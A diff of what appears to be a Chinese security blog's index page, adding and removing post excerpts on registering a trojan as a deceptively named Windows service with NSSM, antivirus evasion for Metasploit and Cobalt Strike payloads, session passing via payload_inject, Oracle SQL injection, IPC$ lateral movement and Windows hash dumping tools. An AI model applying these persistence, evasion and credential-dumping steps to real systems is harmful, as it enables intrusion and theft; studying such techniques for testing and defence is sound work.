@@ -182,6 +182,172 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h1 class="index-header">
         
+        <a href="/2021/05/27/%E4%BD%BF%E7%94%A8nssm%E6%B3%A8%E5%86%8Cwindows%E6%9C%8D%E5%8A%A1%E8%BF%9B%E8%A1%8C%E6%8C%81%E4%B9%85%E5%8C%96/" target="_self">
+          使用nssm注册windows服务进行持久化
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/05/27/%E4%BD%BF%E7%94%A8nssm%E6%B3%A8%E5%86%8Cwindows%E6%9C%8D%E5%8A%A1%E8%BF%9B%E8%A1%8C%E6%8C%81%E4%B9%85%E5%8C%96/" target="_self">
+          
+          
+            
+          
+          前言NSSM是一款注册Windows系统服务的工具。将应用程序注册为windows系统服务可以使其在系统停止、重启等情况仍可自动运行，可用于持久化后门。
+下载http://www.nssm.cc/download
+使用解压并在nssm.exe目录打开cmd
+使用如下命令注册服务
+1nssm install 服务名
+
+
+填写木马路径和服务名，可以填写欺骗性较强的服务名
+
+在服务里设置自动启动
+
+重启
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-05-27 23:11" pubdate>
+              2021-05-27
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/bypass/">bypass</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/bypass/">bypass</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/05/25/%E5%87%A0%E6%AC%BE%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/" target="_self">
+          几款远控免杀工具使用总结
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/05/25/%E5%87%A0%E6%AC%BE%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/" target="_self">
+          
+          
+            
+          
+          前言后渗透过程中往往要使用msf和cs等工具的木马，而默认生成的木马非常容易被杀毒软件检出，这个时候就需要对木马进行免杀，本文介绍几款免杀工具的使用。
+虽然经过杀毒软件多年更新，这些工具免杀效果可能已经很一般了，但是相比于自己写编码器解码器来做免杀更为方便简单，没有任何编程积累也可以直接使用。
+veil下载安装docker安装veil
+1docker pull mattiasohlsson/vei
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-05-25 21:05" pubdate>
+              2021-05-25
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/bypass/">bypass</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/bypass/">bypass</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/05/21/msf%E4%B8%8Ecs%E4%BA%92%E7%9B%B8%E8%BD%AC%E6%8D%A2/" target="_self">
+          msf与cs互相转换
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/05/21/msf%E4%B8%8Ecs%E4%BA%92%E7%9B%B8%E8%BD%AC%E6%8D%A2/" target="_self">
+          
+          
+            
+          
+          msf转cs在cs中配置新监听器，beacon_http即可，设置好监听ip和端口
+使用msf payload_inject模块注入一个新的cs的shell
+12345678backgrounduse exploit/windows/local/payload_injectset payload windows/meterpreter/reverse_httpset lhost cs的ipset 
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-05-21 19:00" pubdate>
+              2021-05-21
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/bypass/">bypass</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/bypass/">bypass</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
         <a href="/2021/05/20/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%86%99webshell%E6%80%BB%E7%BB%93/" target="_self">
           命令执行写webshell总结
         </a>
@@ -556,171 +722,6 @@ https://github.com/hackmdio/codimd
             <i class="iconfont icon-tags"></i>
             
               <a href="/tags/%E5%B7%A5%E5%85%B7/">工具</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/05/06/oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/" target="_self">
-          oracle数据库注入
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/05/06/oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/" target="_self">
-          
-          
-            
-          
-          前言过去渗透遇到oracle注入都是使用工具去跑的，这几天看到相关的文章就想起自己对oracle数据库手工注入的知识点还有所欠缺，本文做次简单的笔记整理
-角色123connect --连接角色，基本角色resource --开发者角色dba --超级管理员角色
-
-注入时常用命令123456789101112查询用户名select user from dual;获取当前数据库名select * fr
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-05-06 21:06" pubdate>
-              2021-05-06
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/oracle/">oracle</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/04/29/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%AD%E5%88%A9%E7%94%A8ipc%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/" target="_self">
-          域渗透中利用ipc命令执行总结
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/04/29/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%AD%E5%88%A9%E7%94%A8ipc%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/" target="_self">
-          
-          
-            
-          
-          域环境搭建参考 https://blog.csdn.net/niexinming/article/details/75650128
-开启$ipc和$admin
-12net share $ipcnet share $admin
-
-
-直接执行12dir \\IP\c$tasklist /S IP /U 用户 /P 密码
-sc123sc \\[HOST] create boom binpath= c:\
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-04-29 22:45" pubdate>
-              2021-04-29
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/04/22/windows%E5%93%88%E5%B8%8C%E6%8F%90%E5%8F%96%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" target="_self">
-          windows哈希提取方式总结
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/04/22/windows%E5%93%88%E5%B8%8C%E6%8F%90%E5%8F%96%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" target="_self">
-          
-          
-            
-          
-          getpass.exeGetpass.exe是闪电小子开发的一款windows下哈希获取软件，直接运行Getpass.exe即可导出windows密码
-pwdump8.exe下载windows工具pwdump8.exe,上传到目标机执行
-.\pwdump8.exe
-
-Quarks-pwdump.exe打开QuarksPwDump.exe目录，命令行执行QuarksPwDump.exe –dhl
-
-
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-04-22 15:30" pubdate>
-              2021-04-22
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/hash/">hash</a>
             
           </div>
         
